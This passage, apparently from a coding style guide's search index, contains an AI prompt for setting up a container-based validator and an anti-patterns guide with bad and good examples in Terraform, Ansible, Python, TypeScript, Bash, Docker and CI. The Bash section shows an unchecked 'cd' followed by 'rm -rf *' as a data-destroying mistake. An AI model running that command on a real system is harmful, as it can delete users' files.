validator into this GitLab repository:\n\n1. Add validation job to \\`.gitlab-ci.yml\\`:\n   - Stage: validate\n   - Use Docker-in-Docker\n   - Run: \\`docker run --rm -v $CI_PROJECT_DIR:/workspace ghcr.io/tydukes/coding-style-guide:v1.0.0 validate\\`\n   - Trigger on: merge_requests, main, develop\n\n2. Create local validation script at \\`scripts/validate.sh\\`\n   - Make it executable\n   - Use container: \\`ghcr.io/tydukes/coding-style-guide:v1.0.0\\`\n\n3. Update README.md with validation instructions\n\n4. Add Makefile with validation targets (optional)\n\\`\\`\\`\n\n### For Local/Team Development\n\n```markdown\nSet up coding style validation for local development:\n\n1. Create \\`Makefile\\` with these targets:\n   - validate, lint, format, validate-docs\n   - Use container: \\`ghcr.io/tydukes/coding-style-guide:v1.0.0\\`\n\n2. Create \\`scripts/validate.sh\\` wrapper script\n   - Accept command as first argument (validate, lint, format)\n   - Use docker volume mount to current directory\n\n3. Add pre-commit hook configuration (if .pre-commit-config.yaml exists)\n\n4. Create \\`CONTRIBUTING.md\\` with instructions:\n   - How to run validation before committing\n   - Available validation commands\n   - How to auto-format code\n\n5. Update main README.md with \"Code Quality\" section\n\\`\\`\\`\n\n---\n\n## Customization Options\n\nYou can customize the integration by modifying the prompt:\n\n### Different Validation Modes\n\nReplace \\`mode: validate\\` with:\n\n- \\`mode: lint\\` - Only run linters (faster, no docs build)\n- \\`mode: format\\` - Auto-format code\n- \\`mode: docs\\` - Only validate documentation\n- \\`mode: metadata\\` - Only check metadata tags\n\n### Specific Container Version\n\nReplace \\`v1.0.0\\` with:\n\n- \\`latest\\` - Always use latest version (may break)\n- \\`v1.0.0\\` - Pin to specific version (recommended)\n- \\`main\\` - Use latest main branch build\n\n### Additional Configuration\n\nAdd to the GitHub Action:\n\n```yaml\n- uses: tydukes/coding-style-guide/.github/actions/validate@v1.0.0\n  with:\n    mode: validate\n    path: .\n    strict: true              # Fail on warnings\n    continue-on-error: false  # Don't continue if validation fails\n</code></pre>","tags":["integration","ai","claude","workflow","automation"]},{"location":"07_integration/integration_prompt/#complete-example-integration","title":"Complete Example Integration","text":"<p>Here's a complete prompt for full integration:</p> <p>```markdown Integrate the tydukes/coding-style-guide validator into this repository with the following:</p>","tags":["integration","ai","claude","workflow","automation"]},{"location":"07_integration/integration_prompt/#github-actions","title":"GitHub Actions","text":"<p>Create `.github/workflows/validate-coding-standards.yml` that: - Triggers on push to main/develop and all PRs - Uses the reusable action: `tydukes/coding-style-guide/.github/actions/validate@v1.0.0` - Runs in validation mode - Should be a required check for PRs</p>","tags":["integration","ai","claude","workflow","automation"]},{"location":"07_integration/integration_prompt/#local-development","title":"Local Development","text":"<p>Add a `Makefile` with these targets: - `make validate` - Full validation - `make lint` - Linters only - `make format` - Auto-format code - `make help` - Show available targets</p> <p>All targets should use: `ghcr.io/tydukes/coding-style-guide:v1.0.0`</p>","tags":["integration","ai","claude","workflow","automation"]},{"location":"07_integration/integration_prompt/#documentation","title":"Documentation","text":"<p>Update `README.md` with a new \"Code Quality\" section that explains: - How to run validation locally - Available make commands - Link to the coding style guide documentation: https://tydukes.github.io/coding-style-guide/</p>","tags":["integration","ai","claude","workflow","automation"]},{"location":"07_integration/integration_prompt/#optional-enhancements","title":"Optional Enhancements","text":"<p>If this repo has: - `.pre-commit-config.yaml` - Add validator hook - `.gitlab-ci.yml` - Add validation job - `CONTRIBUTING.md` - Add validation instructions</p> <p>Container: `ghcr.io/tydukes/coding-style-guide:v1.0.0` Documentation: https://tydukes.github.io/coding-style-guide/</p> <p>Please implement all applicable options based on the repository structure. ```</p>","tags":["integration","ai","claude","workflow","automation"]},{"location":"07_integration/integration_prompt/#quick-reference","title":"Quick Reference","text":"<p>Container Image: <code>ghcr.io/tydukes/coding-style-guide:v1.0.0</code></p> <p>GitHub Action: <code>tydukes/coding-style-guide/.github/actions/validate@v1.0.0</code></p> <p>Documentation: https://tydukes.github.io/coding-style-guide/</p> <p>Commands: <code>validate</code>, <code>lint</code>, <code>format</code>, <code>docs</code>, <code>metadata</code></p> <p>Repository: https://github.com/tydukes/coding-style-guide</p>","tags":["integration","ai","claude","workflow","automation"]},{"location":"08_anti_patterns/","title":"Anti-Patterns and Common Mistakes","text":"","tags":["anti-patterns","best-practices","refactoring","code-quality"]},{"location":"08_anti_patterns/#overview","title":"Overview","text":"<p>This guide presents common anti-patterns and mistakes across DevOps and software engineering practices, along with their correct implementations. Each anti-pattern includes:</p> <ul> <li>\u274c Bad Example: The anti-pattern or mistake</li> <li>\u2705 Good Example: The corrected implementation</li> <li>\ud83d\udcdd Explanation: Why the anti-pattern is problematic and how the correction improves it</li> </ul>","tags":["anti-patterns","best-practices","refactoring","code-quality"]},{"location":"08_anti_patterns/#terraform-anti-patterns","title":"Terraform Anti-Patterns","text":"","tags":["anti-patterns","best-practices","refactoring","code-quality"]},{"location":"08_anti_patterns/#hardcoded-values","title":"\u274c Hardcoded Values","text":"<p>Bad: Hardcoded values make modules inflexible and environment-specific</p> <pre><code>resource \"aws_instance\" \"web\" {\n  ami           = \"ami-0c55b159cbfafe1f0\"\n  instance_type = \"t3.medium\"\n\n  tags = {\n    Name        = \"production-web-server\"\n    Environment = \"production\"\n  }\n}\n</code></pre> <p>Good: Use variables for configurability</p> <pre><code>variable \"ami_id\" {\n  description = \"AMI ID for the EC2 instance\"\n  type        = string\n}\n\nvariable \"instance_type\" {\n  description = \"EC2 instance type\"\n  type        = string\n  default     = \"t3.micro\"\n}\n\nvariable \"environment\" {\n  description = \"Environment name\"\n  type        = string\n\n  validation {\n    condition     = contains([\"dev\", \"staging\", \"production\"], var.environment)\n    error_message = \"Environment must be dev, staging, or production.\"\n  }\n}\n\nvariable \"name\" {\n  description = \"Instance name\"\n  type        = string\n}\n\nresource \"aws_instance\" \"web\" {\n  ami           = var.ami_id\n  instance_type = var.instance_type\n\n  tags = merge(\n    {\n      Name        = var.name\n      Environment = var.environment\n    },\n    var.tags\n  )\n}\n</code></pre> <p>Why: Variables make modules reusable across environments and provide validation</p>","tags":["anti-patterns","best-practices","refactoring","code-quality"]},{"location":"08_anti_patterns/#missing-lifecycle-rules","title":"\u274c Missing Lifecycle Rules","text":"<p>Bad: Recreating resources destroys data</p> <pre><code>resource \"aws_db_instance\" \"database\" {\n  identifier     = \"mydb\"\n  instance_class = \"db.t3.micro\"\n  engine         = \"postgres\"\n}\n</code></pre> <p>Good: Protect critical resources with lifecycle rules</p> <pre><code>resource \"aws_db_instance\" \"database\" {\n  identifier     = \"mydb\"\n  instance_class = \"db.t3.micro\"\n  engine         = \"postgres\"\n\n  lifecycle {\n    prevent_destroy = true\n\n    ignore_changes = [\n      password,\n    ]\n  }\n\n  tags = {\n    CriticalData = \"true\"\n  }\n}\n</code></pre> <p>Why: Lifecycle rules prevent accidental deletion and ignore transient changes</p>","tags":["anti-patterns","best-practices","refactoring","code-quality"]},{"location":"08_anti_patterns/#no-remote-state","title":"\u274c No Remote State","text":"<p>Bad: Local state causes collaboration and CI/CD issues</p> <pre><code>terraform {\n  required_version = \"&gt;= 1.0\"\n}\n</code></pre> <p>Good: Use remote state with locking</p> <pre><code>terraform {\n  required_version = \"&gt;= 1.0\"\n\n  backend \"s3\" {\n    bucket         = \"my-terraform-state\"\n    key            = \"production/terraform.tfstate\"\n    region         = \"us-east-1\"\n    encrypt        = true\n    dynamodb_table = \"terraform-locks\"\n  }\n}\n</code></pre> <p>Why: Remote state enables team collaboration, state locking prevents corruption</p>","tags":["anti-patterns","best-practices","refactoring","code-quality"]},{"location":"08_anti_patterns/#missing-outputs","title":"\u274c Missing Outputs","text":"<p>Bad: No way to access resource attributes</p> <pre><code>resource \"aws_vpc\" \"main\" {\n  cidr_block = \"10.0.0.0/16\"\n}\n</code></pre> <p>Good: Export important values as outputs</p> <pre><code>resource \"aws_vpc\" \"main\" {\n  cidr_block = \"10.0.0.0/16\"\n}\n\noutput \"vpc_id\" {\n  description = \"ID of the VPC\"\n  value       = aws_vpc.main.id\n}\n\noutput \"vpc_cidr\" {\n  description = \"CIDR block of the VPC\"\n  value       = aws_vpc.main.cidr_block\n}\n\noutput \"vpc_arn\" {\n  description = \"ARN of the VPC\"\n  value       = aws_vpc.main.arn\n}\n</code></pre> <p>Why: Outputs make resource attributes available to other modules and for reference</p>","tags":["anti-patterns","best-practices","refactoring","code-quality"]},{"location":"08_anti_patterns/#ansible-anti-patterns","title":"Ansible Anti-Patterns","text":"","tags":["anti-patterns","best-practices","refactoring","code-quality"]},{"location":"08_anti_patterns/#using-shell-when-module-exists","title":"\u274c Using Shell When Module Exists","text":"<p>Bad: Shell commands are not idempotent and error-prone</p> <pre><code>- name: Install nginx\n  shell: apt-get install -y nginx\n</code></pre> <p>Good: Use native modules for idempotency</p> <pre><code>- name: Install nginx\n  ansible.builtin.apt:\n    name: nginx\n    state: present\n    update_cache: yes\n  become: yes\n</code></pre> <p>Why: Modules are idempotent, handle errors better, and provide better reporting</p>","tags":["anti-patterns","best-practices","refactoring","code-quality"]},{"location":"08_anti_patterns/#no-error-handling","title":"\u274c No Error Handling","text":"<p>Bad: Failures stop playbook execution abruptly</p> <pre><code>- name: Download file\n  ansible.builtin.get_url:\n    url: \"https://example.com/file.tar.gz\"\n    dest: \"/tmp/file.tar.gz\"\n</code></pre> <p>Good: Handle errors gracefully with blocks</p> <pre><code>- name: Download and extract file\n  block:\n    - name: Download file\n      ansible.builtin.get_url:\n        url: \"https://example.com/file.tar.gz\"\n        dest: \"/tmp/file.tar.gz\"\n        timeout: 30\n\n    - name: Extract file\n      ansible.builtin.unarchive:\n        src: \"/tmp/file.tar.gz\"\n        dest: \"/opt/app\"\n        remote_src: yes\n\n  rescue:\n    - name: Log failure\n      ansible.builtin.debug:\n        msg: \"Failed to download or extract file\"\n\n    - name: Clean up partial download\n      ansible.builtin.file:\n        path: \"/tmp/file.tar.gz\"\n        state: absent\n\n  always:\n    - name: Report status\n      ansible.builtin.debug:\n        msg: \"Download attempt completed\"\n</code></pre> <p>Why: Block/rescue/always provides structured error handling and cleanup</p>","tags":["anti-patterns","best-practices","refactoring","code-quality"]},{"location":"08_anti_patterns/#hardcoded-values-in-tasks","title":"\u274c Hardcoded Values in Tasks","text":"<p>Bad: Playbooks tied to specific environments</p> <pre><code>- name: Configure application\n  ansible.builtin.template:\n    src: app.conf.j2\n    dest: /etc/app/app.conf\n  vars:\n    db_host: \"prod-db.example.com\"\n    db_port: 5432\n</code></pre> <p>Good: Use variables and group_vars</p> <pre><code>## group_vars/production.yml\ndb_host: \"prod-db.example.com\"\ndb_port: 5432\nenvironment: \"production\"\n\n## group_vars/development.yml\ndb_host: \"dev-db.example.com\"\ndb_port: 5432\nenvironment: \"development\"\n\n## playbook.yml\n- name: Configure application\n  ansible.builtin.template:\n    src: app.conf.j2\n    dest: /etc/app/app.conf\n  notify: Restart application\n</code></pre> <p>Why: Separating variables makes playbooks reusable across environments</p>","tags":["anti-patterns","best-practices","refactoring","code-quality"]},{"location":"08_anti_patterns/#no-tags-for-selective-execution","title":"\u274c No Tags for Selective Execution","text":"<p>Bad: Must run entire playbook for small changes</p> <pre><code>- name: Update system packages\n  ansible.builtin.apt:\n    upgrade: dist\n\n- name: Install application\n  ansible.builtin.apt:\n    name: myapp\n\n- name: Configure application\n  ansible.builtin.template:\n    src: config.j2\n    dest: /etc/myapp/config\n</code></pre> <p>Good: Tag tasks for selective execution</p> <pre><code>- name: Update system packages\n  ansible.builtin.apt:\n    upgrade: dist\n  tags: [system, update]\n\n- name: Install application\n  ansible.builtin.apt:\n    name: myapp\n  tags: [application, install]\n\n- name: Configure application\n  ansible.builtin.template:\n    src: config.j2\n    dest: /etc/myapp/config\n  tags: [application, config]\n  notify: Restart application\n</code></pre> <p>Why: Tags enable running specific tasks without executing entire playbook</p>","tags":["anti-patterns","best-practices","refactoring","code-quality"]},{"location":"08_anti_patterns/#python-anti-patterns","title":"Python Anti-Patterns","text":"","tags":["anti-patterns","best-practices","refactoring","code-quality"]},{"location":"08_anti_patterns/#mutable-default-arguments","title":"\u274c Mutable Default Arguments","text":"<p>Bad: Mutable defaults share state between calls</p> <pre><code>def add_item(item, items=[]):\n    items.append(item)\n    return items\n\nresult1 = add_item(1)  # [1]\nresult2 = add_item(2)  # [1, 2] - unexpected!\n</code></pre> <p>Good: Use None and create new instances</p> <pre><code>def add_item(item, items=None):\n    if items is None:\n        items = []\n    items.append(item)\n    return items\n\nresult1 = add_item(1)  # [1]\nresult2 = add_item(2)  # [2] - correct!\n</code></pre> <p>Why: None as default prevents shared mutable state between function calls</p>","tags":["anti-patterns","best-practices","refactoring","code-quality"]},{"location":"08_anti_patterns/#bare-except-clauses","title":"\u274c Bare except Clauses","text":"<p>Bad: Catches everything, including KeyboardInterrupt and SystemExit</p> <pre><code>try:\n    process_data()\nexcept:\n    print(\"Something went wrong\")\n</code></pre> <p>Good: Catch specific exceptions</p> <pre><code>try:\n    process_data()\nexcept ValueError as e:\n    logger.error(f\"Invalid data: {e}\")\n    raise\nexcept IOError as e:\n    logger.error(f\"File error: {e}\")\n    raise\nexcept Exception as e:\n    logger.exception(f\"Unexpected error: {e}\")\n    raise\n</code></pre> <p>Why: Specific exceptions allow proper error handling without masking critical errors</p>","tags":["anti-patterns","best-practices","refactoring","code-quality"]},{"location":"08_anti_patterns/#using-imports","title":"\u274c Using * Imports","text":"<p>Bad: Pollutes namespace and makes code unclear</p> <pre><code>from os import *\nfrom sys import *\nfrom pathlib import *\n</code></pre> <p>Good: Import specific names or use qualified imports</p> <pre><code>from pathlib import Path\nimport os\nimport sys\n\n## or\nfrom pathlib import (\n    Path,\n    PurePath,\n)\n</code></pre> <p>Why: Explicit imports make code more maintainable and prevent naming conflicts</p>","tags":["anti-patterns","best-practices","refactoring","code-quality"]},{"location":"08_anti_patterns/#not-using-context-managers","title":"\u274c Not Using Context Managers","text":"<p>Bad: File handles may not be closed properly</p> <pre><code>f = open('file.txt', 'r')\ndata = f.read()\nf.close()  # May not execute if exception occurs\n</code></pre> <p>Good: Use context managers for automatic cleanup</p> <pre><code>from pathlib import Path\n\n## Modern approach\ndata = Path('file.txt').read_text()\n\n## Or with context manager\nwith open('file.txt', 'r') as f:\n    data = f.read()\n</code></pre> <p>Why: Context managers ensure resources are properly released even if exceptions occur</p>","tags":["anti-patterns","best-practices","refactoring","code-quality"]},{"location":"08_anti_patterns/#string-concatenation-in-loops","title":"\u274c String Concatenation in Loops","text":"<p>Bad: Inefficient string building</p> <pre><code>result = \"\"\nfor item in items:\n    result += str(item) + \",\"\n</code></pre> <p>Good: Use join() for string building</p> <pre><code>result = \",\".join(str(item) for item in items)\n</code></pre> <p>Why: join() is O(n) instead of O(n\u00b2) for string concatenation</p>","tags":["anti-patterns","best-practices","refactoring","code-quality"]},{"location":"08_anti_patterns/#typescript-anti-patterns","title":"TypeScript Anti-Patterns","text":"","tags":["anti-patterns","best-practices","refactoring","code-quality"]},{"location":"08_anti_patterns/#using-any-type","title":"\u274c Using any Type","text":"<p>Bad: Defeats TypeScript's type safety</p> <pre><code>function processData(data: any) {\n  return data.value.toUpperCase();\n}\n</code></pre> <p>Good: Use proper types or unknown</p> <pre><code>interface DataWithValue {\n  value: string;\n}\n\nfunction processData(data: DataWithValue): string {\n  return data.value.toUpperCase();\n}\n\n// For truly unknown data\nfunction processUnknownData(data: unknown): string {\n  if (typeof data === 'object' &amp;&amp; data !== null &amp;&amp; 'value' in data) {\n    const typed = data as DataWithValue;\n    if (typeof typed.value === 'string') {\n      return typed.value.toUpperCase();\n    }\n  }\n  throw new Error('Invalid data structure');\n}\n</code></pre> <p>Why: Proper types catch errors at compile time and enable IDE features</p>","tags":["anti-patterns","best-practices","refactoring","code-quality"]},{"location":"08_anti_patterns/#non-null-assertions-without-validation","title":"\u274c Non-null Assertions Without Validation","text":"<p>Bad: Can cause runtime errors</p> <pre><code>const user = users.find(u =&gt; u.id === id)!;\nconsole.log(user.name);  // May crash if not found\n</code></pre> <p>Good: Handle null/undefined explicitly</p> <pre><code>const user = users.find(u =&gt; u.id === id);\nif (!user) {\n  throw new Error(`User ${id} not found`);\n}\nconsole.log(user.name);  // Safe\n</code></pre> <p>Why: Explicit null checks prevent runtime errors and make intent clear</p>","tags":["anti-patterns","best-practices","refactoring","code-quality"]},{"location":"08_anti_patterns/#type-assertions-without-validation","title":"\u274c Type Assertions Without Validation","text":"<p>Bad: Unsafe type coercion</p> <pre><code>const data = JSON.parse(response) as User;\n</code></pre> <p>Good: Validate before asserting</p> <pre><code>function isUser(obj: unknown): obj is User {\n  return (\n    typeof obj === 'object' &amp;&amp;\n    obj !== null &amp;&amp;\n    'id' in obj &amp;&amp;\n    'name' in obj &amp;&amp;\n    'email' in obj &amp;&amp;\n    typeof (obj as any).id === 'string' &amp;&amp;\n    typeof (obj as any).name === 'string' &amp;&amp;\n    typeof (obj as any).email === 'string'\n  );\n}\n\nconst parsed = JSON.parse(response);\nif (!isUser(parsed)) {\n  throw new Error('Invalid user data');\n}\nconst data: User = parsed;  // Safe\n</code></pre> <p>Why: Runtime validation ensures type safety for external data</p>","tags":["anti-patterns","best-practices","refactoring","code-quality"]},{"location":"08_anti_patterns/#not-using-optional-chaining","title":"\u274c Not Using Optional Chaining","text":"<p>Bad: Verbose null checks</p> <pre><code>const city = user &amp;&amp; user.address &amp;&amp; user.address.city;\n</code></pre> <p>Good: Use optional chaining</p> <pre><code>const city = user?.address?.city;\n</code></pre> <p>Why: Optional chaining is more concise and handles null/undefined safely</p>","tags":["anti-patterns","best-practices","refactoring","code-quality"]},{"location":"08_anti_patterns/#ignoring-promise-rejections","title":"\u274c Ignoring Promise Rejections","text":"<p>Bad: Unhandled promise rejections</p> <pre><code>async function loadData() {\n  const data = await fetchData();\n  processData(data);\n}\n\nloadData();  // No error handling\n</code></pre> <p>Good: Handle promise rejections</p> <pre><code>async function loadData(): Promise&lt;void&gt; {\n  try {\n    const data = await fetchData();\n    processData(data);\n  } catch (error) {\n    console.error('Failed to load data:', error);\n    throw error;\n  }\n}\n\nloadData().catch(error =&gt; {\n  console.error('Unhandled error:', error);\n  // Report to error tracking service\n});\n</code></pre> <p>Why: Proper error handling prevents silent failures and aids debugging</p>","tags":["anti-patterns","best-practices","refactoring","code-quality"]},{"location":"08_anti_patterns/#bash-anti-patterns","title":"Bash Anti-Patterns","text":"","tags":["anti-patterns","best-practices","refactoring","code-quality"]},{"location":"08_anti_patterns/#not-quoting-variables","title":"\u274c Not Quoting Variables","text":"<p>Bad: Breaks with spaces or special characters</p> <pre><code>file=$1\nrm $file\n</code></pre> <p>Good: Always quote variable expansions</p> <pre><code>file=\"${1}\"\nrm \"${file}\"\n</code></pre> <p>Why: Quoting prevents word splitting and glob expansion</p>","tags":["anti-patterns","best-practices","refactoring","code-quality"]},{"location":"08_anti_patterns/#using-ls-for-file-iteration","title":"\u274c Using ls for File Iteration","text":"<p>Bad: Breaks with spaces and special characters</p> <pre><code>for file in $(ls *.txt); do\n  process \"${file}\"\ndone\n</code></pre> <p>Good: Use glob patterns directly</p> <pre><code>for file in *.txt; do\n  [[ -f \"${file}\" ]] || continue\n  process \"${file}\"\ndone\n</code></pre> <p>Why: Glob patterns handle special characters correctly and avoid parsing ls output</p>","tags":["anti-patterns","best-practices","refactoring","code-quality"]},{"location":"08_anti_patterns/#not-checking-command-success","title":"\u274c Not Checking Command Success","text":"<p>Bad: Continues after failures</p> <pre><code>cd /some/directory\nrm -rf *\n</code></pre> <p>Good: Check exit codes and use set -e</p> <pre><code>#!/usr/bin/env bash\nset -euo pipefail\n\nif ! cd /some/directory; then\n  echo \"Failed to change directory\" &gt;&amp;2\n  exit 1\nfi\n\nrm -rf ./*\n</code></pre> <p>Why: Checking exit codes prevents cascading failures</p>","tags":["anti-patterns","best-practices","refactoring","code-quality"]},{"location":"08_anti_patterns/#useless-use-of-cat","title":"\u274c Useless Use of cat","text":"<p>Bad: Unnecessary process creation</p> <pre><code>cat file.txt | grep \"pattern\"\n</code></pre> <p>Good: Use input redirection</p> <pre><code>grep \"pattern\" file.txt\n## or\ngrep \"pattern\" &lt; file.txt\n</code></pre> <p>Why: Eliminates unnecessary process and improves performance</p>","tags":["anti-patterns","best-practices","refactoring","code-quality"]},{"location":"08_anti_patterns/#not-using-for-tests","title":"\u274c Not Using [[ ]] for Tests","text":"<p>Bad: [ ] is less powerful and error-prone</p> <pre><code>if [ $var = \"value\" ]; then\n  echo \"match\"\nfi\n</code></pre> <p>Good: Use [[ ]] for safer tests</p> <pre><code>if [[ \"${var}\" == \"value\" ]]; then\n  echo \"match\"\nfi\n</code></pre> <p>Why: [[ ]] provides pattern matching, regex support, and safer variable handling</p>","tags":["anti-patterns","best-practices","refactoring","code-quality"]},{"location":"08_anti_patterns/#docker-anti-patterns","title":"Docker Anti-Patterns","text":"","tags":["anti-patterns","best-practices","refactoring","code-quality"]},{"location":"08_anti_patterns/#using-latest-tag","title":"\u274c Using latest Tag","text":"<p>Bad: Unpredictable builds and deployments</p> <pre><code>FROM node:latest\n\nCOPY . .\nRUN npm install\n</code></pre> <p>Good: Pin specific versions</p> <pre><code>FROM node:20.10.0-alpine3.18\n\nWORKDIR /app\n\nCOPY package*.json ./\nRUN npm ci --only=production\n\nCOPY . .\n\nUSER node\nCMD [\"node\", \"server.js\"]\n</code></pre> <p>Why: Specific versions ensure reproducible builds and prevent breaking changes</p>","tags":["anti-patterns","best-practices","refactoring","code-quality"]},{"location":"08_anti_patterns/#running-as-root","title":"\u274c Running as Root","text":"<p>Bad: Security vulnerability</p> <pre><code>FROM ubuntu:22.04\n\nCOPY app /app\n\nCMD [\"/app/server\"]\n</code></pre> <p>Good: Create and use non-root user</p> <pre><code>FROM ubuntu:22.04\n\nRUN groupadd -r appuser &amp;&amp; useradd -r -g appuser appuser\n\nWORKDIR /app\n\nCOPY --chown=appuser:appuser app /app\n\nUSER appuser\n\nCMD [\"/app/server\"]\n</code></pre> <p>Why: Running as non-root reduces attack surface</p>","tags":["anti-patterns","best-practices","refactoring","code-quality"]},{"location":"08_anti_patterns/#not-using-multi-stage-builds","title":"\u274c Not Using Multi-stage Builds","text":"<p>Bad: Large images with build dependencies</p> <pre><code>FROM node:20\n\nWORKDIR /app\n\nCOPY package*.json ./\nRUN npm install\n\nCOPY . .\nRUN npm run build\n\nCMD [\"node\", \"dist/server.js\"]\n</code></pre> <p>Good: Use multi-stage builds for smaller images</p> <pre><code>## Build stage\nFROM node:20-alpine AS builder\n\nWORKDIR /app\n\nCOPY package*.json ./\nRUN npm ci\n\nCOPY . .\nRUN npm run build\n\n## Production stage\nFROM node:20-alpine AS production\n\nRUN addgroup -g 1001 -S appuser &amp;&amp; \\\n    adduser -S appuser -u 1001\n\nWORKDIR /app\n\nCOPY --from=builder --chown=appuser:appuser /app/dist ./dist\nCOPY --from=builder --chown=appuser:appuser /app/node_modules ./node_modules\nCOPY --chown=appuser:appuser package.json ./\n\nUSER appuser\n\nCMD [\"node\", \"dist/server.js\"]\n</code></pre> <p>Why: Multi-stage builds reduce final image size by excluding build dependencies</p>","tags":["anti-patterns","best-practices","refactoring","code-quality"]},{"location":"08_anti_patterns/#installing-unnecessary-packages","title":"\u274c Installing Unnecessary Packages","text":"<p>Bad: Bloated images with security vulnerabilities</p> <pre><code>FROM ubuntu:22.04\n\nRUN apt-get update &amp;&amp; apt-get install -y \\\n    curl \\\n    wget \\\n    vim \\\n    git \\\n    build-essential\n</code></pre> <p>Good: Install only required packages</p> <pre><code>FROM ubuntu:22.04\n\nRUN apt-get update &amp;&amp; \\\n    apt-get install -y --no-install-recommends \\\n        curl \\\n        ca-certificates &amp;&amp; \\\n    apt-get clean &amp;&amp; \\\n    rm -rf /var/lib/apt/lists/*\n</code></pre> <p>Why: Minimal images reduce attack surface and image size</p>","tags":["anti-patterns","best-practices","refactoring","code-quality"]},{"location":"08_anti_patterns/#no-health-checks","title":"\u274c No Health Checks","text":"<p>Bad: Container appears healthy even when app crashes</p> <pre><code>FROM node:20-alpine\n\nCOPY app /app\n\nCMD [\"node\", \"/app/server.js\"]\n</code></pre> <p>Good: Add health checks</p> <pre><code>FROM node:20-alpine\n\nWORKDIR /app\n\nCOPY package*.json ./\nRUN npm ci --only=production\n\nCOPY . .\n\nHEALTHCHECK --interval=30s --timeout=3s --start-period=5s --retries=3 \\\n  CMD node healthcheck.js || exit 1\n\nCMD [\"node\", \"server.js\"]\n</code></pre> <p>Why: Health checks enable container orchestrators to detect and restart failed containers</p>","tags":["anti-patterns","best-practices","refactoring","code-quality"]},{"location":"08_anti_patterns/#github-actions-anti-patterns","title":"GitHub Actions Anti-Patterns","text":"","tags":["anti-patterns","best-practices","refactoring","code-quality"]},{"location":"08_anti_patterns/#no-job-dependencies","title":"\u274c No Job Dependencies","text":"<p>Bad: Jobs run in wrong order or waste resources</p> <pre><code>jobs:\n  test:\n    runs-on: ubuntu-latest\n    steps:\n      - run: npm test\n\n  deploy:\n    runs-on: ubuntu-latest\n    steps:\n      - run: npm run deploy\n</code></pre> <p>Good: Define job dependencies</p> <pre><code>jobs:\n  test:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n      - run: npm test\n\n  deploy:\n    needs: test\n    runs-on: ubuntu-latest\n    if: github.ref == 'refs/heads/main'\n    steps:\n      - uses: actions/checkout@v4\n      - run: npm run deploy\n</code></pre> <p>Why: Dependencies ensure jobs run in correct order and only when predecessors succeed</p>","tags":["anti-patterns","best-practices","refactoring","code-quality"]},{"location":"08_anti_patterns/#not-caching-dependencies","title":"\u274c Not Caching Dependencies","text":"<p>Bad: Wastes time reinstalling dependencies</p> <pre><code>steps:\n  - uses: actions/checkout@v4\n  - uses: actions/setup-node@v4\n  - run: npm install\n  - run: npm test\n</code></pre> <p>Good: Cache dependencies</p> <pre><code>steps:\n  - uses: actions/checkout@v4\n\n  - uses: actions/setup-node@v4\n    with:\n      node-version: 20\n      cache: 'npm'\n\n  - run: npm ci\n  - run: npm test\n</code></pre> <p>Why: Caching significantly reduces build times</p>","tags":["anti-patterns","best-practices","refactoring","code-quality"]},{"location":"08_anti_patterns/#hardcoded-secrets","title":"\u274c Hardcoded Secrets","text":"<p>Bad: Security vulnerability</p> <pre><code>steps:\n  - run: |\n      curl -H \"Authorization: token ghp_xxxxxxxxxxxx\" \\\n        https://api.github.com/repos/...\n</code></pre> <p>Good: Use GitHub Secrets</p> <pre><code>steps:\n  - run: |\n      curl -H \"Authorization: token ${{ secrets.GITHUB_TOKEN }}\" \\\n        https://api.github.com/repos/...\n</code></pre> <p>Why: Secrets are encrypted and not visible in logs</p>","tags":["anti-patterns","best-practices","refactoring","code-quality"]},{"location":"08_anti_patterns/#not-using-matrix-builds","title":"\u274c Not Using Matrix Builds","text":"<p>Bad: Duplicate job definitions</p> <pre><code>jobs:\n  test-node-18:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/setup-node@v4\n        with:\n          node-version: 18\n      - run: npm test\n\n  test-node-20:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/setup-node@v4\n        with:\n          node-version: 20\n      - run: npm test\n</code></pre> <p>Good: Use matrix strategy</p> <pre><code>jobs:\n  test:\n    runs-on: ubuntu-latest\n\n    strategy:\n      matrix:\n        node-version: [18, 20, 21]\n\n    steps:\n      - uses: actions/checkout@v4\n\n      - uses: actions/setup-node@v4\n        with:\n          node-version: ${{ matrix.node-version }}\n          cache: 'npm'\n\n      - run: npm ci\n      - run: npm test\n</code></pre> <p>Why: Matrix builds reduce duplication and test multiple versions efficiently</p>","tags":["anti-patterns","best-practices","refactoring","code-quality"]},{"location":"08_anti_patterns/#no-timeout-limits","title":"\u274c No Timeout Limits","text":"<p>Bad: Stuck jobs consume runner time</p> <pre><code>jobs:\n  build:\n    runs-on: ubuntu-latest\n    steps:\n      - run: npm run build\n</code></pre> <p>Good: Set reasonable timeouts</p> <pre><code>jobs:\n  build:\n    runs-on: ubuntu-latest\n    timeout-minutes: 15\n\n    steps:\n      - run: npm run build\n        timeout-minutes: 10\n</code></pre> <p>Why: Timeouts prevent hung jobs from consuming resources</p>","tags":["anti-patterns","best-practices","refactoring","code-quality"]},{"location":"08_anti_patterns/#cicd-general-anti-patterns","title":"CI/CD General Anti-Patterns","text":"","tags":["anti-patterns","best-practices","refactoring","code-quality"]},{"location":"08_anti_patterns/#testing-in-production","title":"\u274c Testing in Production","text":"<p>Bad: Deploying untested code</p> <pre><code>deploy:\n  stage: deploy\n  script:\n    - kubectl apply -f k8s/\n</code></pre> <p>Good: Test before deploying</p> <pre><code>test:\n  stage: test\n  script:\n    - npm run test\n    - npm run lint\n    - npm run build\n\ndeploy-staging:\n  stage: deploy\n  environment: staging\n  needs: [test]\n  script:\n    - kubectl apply -f k8s/ --context=staging\n\ndeploy-production:\n  stage: deploy\n  environment: production\n  needs: [deploy-staging]\n  when: manual\n  only:\n    - main\n  script:\n    - kubectl apply -f k8s/ --context=production\n</code></pre> <p>Why: Staged deployments with testing catch issues before production</p>","tags":["anti-patterns","best-practices","refactoring","code-quality"]},{"location":"08_anti_patterns/#no-rollback-strategy","title":"\u274c No Rollback Strategy","text":"<p>Bad: Failed deployments require manual intervention</p> <pre><code>deploy:\n  script:\n    - kubectl set image deployment/app app=myapp:${CI_COMMIT_SHA}\n</code></pre> <p>Good: Implement automated rollback</p> <pre><code>deploy:\n  script:\n    - kubectl set image deployment/app app=myapp:${CI_COMMIT_SHA}\n    - kubectl rollout status deployment/app --timeout=5m || kubectl rollout undo deployment/app\n</code></pre> <p>Why: Automated rollback minimizes downtime when deployments fail</p>","tags":["anti-patterns","best-practices","refactoring","code-quality"]},{"location":"08_anti_patterns/#long-running-pipelines","title":"\u274c Long-Running 